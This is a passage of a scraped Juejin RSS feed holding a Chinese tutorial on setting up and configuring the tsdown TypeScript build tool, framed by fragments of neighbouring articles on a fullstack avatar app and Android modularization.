<p>走到今天，你会发现全栈开发最迷人的地方在于 <strong>“掌控感”</strong>。</p>
<ul>
<li>你在 <strong>Frontend</strong> 像搭积木一样用 <code>Drawer</code> 家族组件构建了优雅的交互。</li>
<li>你在 <strong>Store</strong> 梳理了数据流，让状态更新井井有条。</li>
<li>你在 <strong>Backend</strong> 指挥强大的 AI 模型为你服务。</li>
</ul>
<p>当你在手机模拟器上点击那个紫色按钮，看着 Loading 转圈，最后弹出一个根据你名字生成的精美卡通头像时，那种“我创造了这个世界”的成就感，就是编程最大的乐趣吧！🥰</p>
<p><strong>💻 下期预告：</strong>
头像有了，是不是该发点带图的动态了？下一节，我们将深入探讨 <strong>图片上传与云存储</strong>，让你的应用不仅仅能看，还能“存”！</p>
<p>掘金的伙伴们，如果你觉得这篇文章对你有帮助，别忘了 <strong>点赞 👍、收藏 🌟、关注 👀</strong> 三连哦！你的支持是我持续更新的最大动力！</p>
<p>我们下期见！👋</p>
<hr/>
<p><em>本文代码基于 AI Fullstack Project 教学项目，仅供学习参考。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[tsdown 快速上手实操：零配置也能跑的TS极速构建工具]]></title>    <link>https://juejin.cn/post/7603043152673390607</link>    <guid>https://juejin.cn/post/7603043152673390607</guid>    <pubDate>2026-02-05T14:04:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603043152673390607" data-draft-id="7603183929252102196" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="tsdown 快速上手实操：零配置也能跑的TS极速构建工具"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-02-05T14:04:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="如果你好"/> <meta itemprop="url" content="https://juejin.cn/user/2272012281328215"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            tsdown 快速上手实操：零配置也能跑的TS极速构建工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2272012281328215/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    如果你好
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:04:18.000Z" title="Thu Feb 05 2026 14:04:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、tsdown的实用优势</h2>
<ol>
<li><strong>极速构建</strong>：底层是esbuild，比传统tsc编译快几倍，大项目也能秒级构建；</li>
<li><strong>零配置友好</strong>：配置文件可以空内容，默认规则能覆盖80%的TS项目需求；</li>
<li><strong>功能全且实用</strong>：多格式输出、自动生成d.ts、代码压缩、监听模式、树摇这些开发必备功能都有；</li>
<li><strong>上手成本低</strong>：单配置文件+简洁配置项，不用同时学多个工具的语法，新手也能一次配好。</li>
</ol>
<p>特别适合做<strong>TS工具库、NPM包、Node小模块</strong>，轻量又高效。</p>
<h2 data-id="heading-1">二、项目初始化 &amp; 依赖安装</h2>
<p>新建项目文件夹，执行以下命令，两步搞定初始化，依赖只装必要的：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 快速初始化package.json，一路默认回车</span>
npm init -y
<span class="hljs-comment"># 安装tsdown开发依赖</span>
npm i -D tsdown
<span class="hljs-comment"># 【可选】如果需要生成.d.ts类型声明文件，安装typescript（发布NPM包建议装）</span>
npm i -D typescript
</code></pre>
<h2 data-id="heading-2">三、标准化项目文件结构</h2>
<p>搭一个通用的TS项目结构，清晰易维护，构建产物会自动生成到dist目录，不用手动创建：</p>
<pre><code class="hljs language-bash" lang="bash">├── dist/               <span class="hljs-comment"># 构建后自动生成（产物、类型声明、sourcemap）</span>
├── src/
│   ├── index.ts        <span class="hljs-comment"># 项目入口（统一导出所有模块）</span>
│   └── tools.ts        <span class="hljs-comment"># 业务工具函数（示例代码）</span>
├── package.json        <span class="hljs-comment"># 项目信息 + 构建脚本</span>
└── tsdown.config.ts    <span class="hljs-comment"># tsdown配置文件（可空，支持自定义）</span>
</code></pre>
<h2 data-id="heading-3">四、编写示例代码</h2>
<p>替换成日常开发中常用的<strong>工具函数</strong>，带完整TS类型注解，简单实用，方便后续验证构建效果。</p>
<h3 data-id="heading-4">src/tools.ts - 工具函数模块</h3>
<p>写两个高频用到的小工具，加了简单注释，符合TS开发规范：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 精准判断数据类型
 * <span class="hljs-doctag">@param</span> val 任意值
 * <span class="hljs-doctag">@returns</span> 小写类型名（如string、array、null）
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getType</span>(<span class="hljs-params">val: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(val).<span class="hljs-title function_">slice</span>(<span class="hljs-number">8</span>, -<span class="hljs-number">1</span>).<span class="hljs-title function_">toLowerCase</span>()
}

<span class="hljs-comment">/**
 * 数组去重（支持数字/字符串数组）
 * <span class="hljs-doctag">@param</span> arr 待去重数组
 * <span class="hljs-doctag">@returns</span> 去重后的新数组
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> uniqueArr&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>&gt;(<span class="hljs-attr">arr</span>: T[]): T[] {
  <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(arr)]
}
</code></pre>
<h3 data-id="heading-5">src/index.ts - 项目统一入口</h3>
<p>作为对外暴露的唯一入口，按需导出工具函数，外部引用时只需要导入这个文件就行，符合模块化开发习惯：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 统一导出，对外提供清晰的API</span>
<span class="hljs-keyword">export</span> { getType, uniqueArr } <span class="hljs-keyword">from</span> <span class="hljs-string">'./tools'</span>
</code></pre>
<h2 data-id="heading-6">五、tsdown.config.ts 配置：空配置可用 + 特殊属性全解</h2>
<p>这是核心部分，tsdown支持<strong>配置文件空内容直接运行</strong>（用默认配置），也能根据需求加自定义配置和特殊属性。下面提供两个模板，按需选择，都带TS类型提示。</p>
<h3 data-id="heading-7">模板1：最简空配置（推荐小项目/快速开发）</h3>
<p>配置文件里什么都不用写，直接导出空配置，tsdown会自动启用<strong>内置默认配置</strong>，开箱即用，省时间：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'tsdown'</span>

<span class="hljs-comment">// 空配置：直接用默认规则，无需手动配置任何项</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({})
</code></pre>
<h3 data-id="heading-8">模板2：完整配置（含特殊属性，推荐生产/大项目/NPM包）</h3>
<p>保留所有核心配置项，重点标注<strong>特殊属性</strong>（日常易忽略、生产常用），每一项都加了实用注释，可根据自己的项目场景修改，直接替换上面的空配置就行：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'tsdown'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 基础入口输出配置</span>
  <span class="hljs-attr">entry</span>: [<span class="hljs-string">'./src/index.ts'</span>], <span class="hljs-comment">// 入口：单入口写字符串，多入口写数组，空配置默认识别src/index.ts</span>
  <span class="hljs-attr">outDir</span>: <span class="hljs-string">'./dist'</span>,          <span class="hljs-comment">// 输出目录，默认就是./dist</span>
  <span class="hljs-attr">target</span>: <span class="hljs-string">'es6'</span>,             <span class="hljs-comment">// 语法降级，es6兼容大部分现代环境，需要兼容低版本可设为es5</span>
  <span class="hljs-attr">format</span>: <span class="hljs-string">'esm'</span>,             <span class="hljs-comment">// 输出格式：esm/cjs/iife，可写数组同时输出多格式（如['esm', 'cjs']）</span>
  <span class="hljs-attr">platform</span>: <span class="hljs-string">'neutral'</span>,       <span class="hljs-comment">// 运行平台：node（Node环境）/browser（浏览器）/neutral（通用）</span>

  <span class="hljs-comment">// 优化相关配置</span>
  <span class="hljs-attr">clean</span>: <span class="hljs-literal">true</span>,        <span class="hljs-comment">// 构建前清空dist，建议开启，避免旧产物残留</span>
  <span class="hljs-attr">dts</span>: <span class="hljs-literal">true</span>,          <span class="hljs-comment">// 生成.d.ts类型声明，需提前装typescript，发布NPM包必开</span>
  <span class="hljs-attr">sourcemap</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// 生成源码映射，方便调试，生产环境可设为false减小体积</span>
  <span class="hljs-attr">treeshake</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// 树摇：自动删除未使用代码，默认开启，不用手动关</span>
  <span class="hljs-attr">minify</span>: <span class="hljs-literal">true</span>,       <span class="hljs-comment">// 代码压缩，生产开、开发关（开发关了方便看编译后的代码）</span>

  <span class="hljs-comment">// 开发调试配置</span>
  <span class="hljs-attr">watch</span>: <span class="hljs-literal">false</span>,       <span class="hljs-comment">// 监听模式：开发开，文件修改自动重新构建，生产关</span>

  <span class="hljs-comment">// 特殊属性（重点）：日常开发易忽略，按需使用</span>
  <span class="hljs-attr">unbundle</span>: <span class="hljs-literal">false</span>,    <span class="hljs-comment">// 拆包：多入口项目开，按入口拆分产物；单入口关了就行</span>
  <span class="hljs-attr">external</span>: [],       <span class="hljs-comment">// 外部依赖：指定不打包进产物的包（如react/vue），需外部自行引入</span>
  <span class="hljs-attr">noExternal</span>: []      <span class="hljs-comment">// 强制打包：覆盖external，即使在external里也强制打包进产物</span>
})
</code></pre>
<h3 data-id="heading-9">关键特殊属性实用说明</h3>
<p>不用死记，知道这些场景怎么用就行：</p>
<ul>
<li><code>clean</code>：必开，否则每次构建的新产物会和旧产物混在一起，容易出问题；</li>
<li><code>dts</code>：发布NPM包必开，否则其他TS项目引用时没有类型提示；</li>
<li><code>external/noExternal</code>：开发基于React/Vue的工具库时用，不让核心库打包进产物，减小体积；</li>
<li><code>unbundle</code>：只有多入口项目需要开，单入口开了反而会生成多余文件；</li>
<li><code>minify</code>：开发阶段建议设为false，编译后的代码有格式，方便调试问题。</li>
</ul>
<h2 data-id="heading-10">六、配置package.json 构建脚本</h2>
<p>添加两个常用脚本，符合前端开发的使用习惯，一行命令就能构建/开发，空配置和完整配置都能适配：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tsdown-demo"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 输出esm格式建议加，符合Node的ES模块规范，输出cjs可删除</span>
  <span class="hljs-attr">"main"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.js"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 产物主入口，NPM包必备</span>
  <span class="hljs-attr">"types"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.d.ts"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 类型声明入口，开dts时必配</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tsdown"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 生产构建：一次性打包所有产物</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tsdown --watch"</span> <span class="hljs-comment">// 开发模式：监听文件变化，自动重新构建</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"tsdown"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^latest"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.5.4"</span> <span class="hljs-comment">// 开dts时必须装，没开可以删</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-11">七、执行构建 &amp; 验证结果</h2>
<p>配置全部搞定后，执行简单命令就能构建，不管是空配置还是完整配置，步骤都一样：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生产环境构建（生成压缩后的产物，适合发布/部署）</span>
npm run build
<span class="hljs-comment"># 开发环境构建（监听文件变化，自动更新，适合写代码时用）</span>
npm run dev
</code></pre>
<h3 data-id="heading-12">构建产物说明</h3>
<p>执行<code>npm run build</code>后，dist目录会自动生成对应的产物文件，以<strong>开dts/sourcemap/minify</strong>为例，产物如下，可直接用于NPM包发布或其他项目引用：</p>
<pre><code class="hljs language-python" lang="python">dist/
├── index.js        <span class="hljs-comment"># 编译+压缩后的JS核心产物</span>
├── index.d.ts      <span class="hljs-comment"># 自动生成的类型声明文件（TS项目引用有提示）</span>
└── index.js.<span class="hljs-built_in">map</span>    <span class="hljs-comment"># 源码映射文件（方便调试）</span>
</code></pre>
<h3 data-id="heading-13">快速验证构建是否成功</h3>
<p>在dist目录下新建<code>test.js</code>，引入构建后的产物，执行命令看输出，验证功能是否正常：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { getType, uniqueArr } <span class="hljs-keyword">from</span> <span class="hljs-string">'./index.js'</span>

<span class="hljs-comment">// 测试工具函数</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getType</span>(<span class="hljs-string">'tsdown 实操'</span>)); <span class="hljs-comment">// 输出：string</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getType</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]));      <span class="hljs-comment">// 输出：array</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">uniqueArr</span>([<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>]));<span class="hljs-comment">// 输出：[1,2,3]</span>
</code></pre>
<p>执行以下命令，控制台正常输出结果，说明构建完全成功：</p>
<pre><code class="hljs language-bash" lang="bash">node dist/test.js
</code></pre>
<h2 data-id="heading-14">八、核心配置项速查</h2>
<p>整理了日常开发最常用的配置项、作用和默认值，贴在这方便开发时快速查阅，不用每次翻文档：</p>


















































































<table><thead><tr><th>配置项</th><th>核心作用</th><th>可选值/类型</th><th>默认值</th><th>实用建议</th></tr></thead><tbody><tr><td>entry</td><td>指定项目入口</td><td>string/string[]</td><td>src/index.ts</td><td>单入口写字符串，多入口写数组</td></tr><tr><td>outDir</td><td>产物输出目录</td><td>string</td><td>./dist</td><td>一般不用改</td></tr><tr><td>format</td><td>产物输出格式</td><td>esm/cjs/iife/数组</td><td>esm</td><td>发布NPM包可配['esm','cjs']</td></tr><tr><td>target</td><td>TS语法降级目标</td><td>es5/es6/es2020等</td><td>es6</td><td>需兼容低版本设为es5</td></tr><tr><td>dts</td><td>生成类型声明</td><td>boolean</td><td>false</td><td>发布NPM包必开，需装typescript</td></tr><tr><td>clean</td><td>构建前清空输出目录</td><td>boolean</td><td>false</td><td>建议始终设为true</td></tr><tr><td>minify</td><td>代码压缩</td><td>boolean</td><td>false</td><td>生产开，开发关</td></tr><tr><td>watch</td><td>文件变化自动构建</td><td>boolean</td><td>false</td><td>开发开，生产关</td></tr><tr><td>external</td><td>不打包的外部依赖</td><td>string[]</td><td>[]</td><td>开发框架工具库时用</td></tr><tr><td>unbundle</td><td>按入口拆包</td><td>boolean</td><td>false</td><td>多入口开，单入口关</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Now in Android 现代应用开发实践（一） - 模块化设计]]></title>    <link>https://juejin.cn/post/7603215839581126666</link>    <guid>https://juejin.cn/post/7603215839581126666</guid>    <pubDate>2026-02-05T10:46:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603215839581126666" data-draft-id="7602531501456621577" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Now in Android 现代应用开发实践（一） - 模块化设计"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-05T10:46:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="林栩link"/> <meta itemprop="url" content="https://juejin.cn/user/870468939434039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Now in Android 现代应用开发实践（一） - 模块化设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/870468939434039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    林栩link
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:46:40.000Z" title="Thu Feb 05 2026 10:46:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 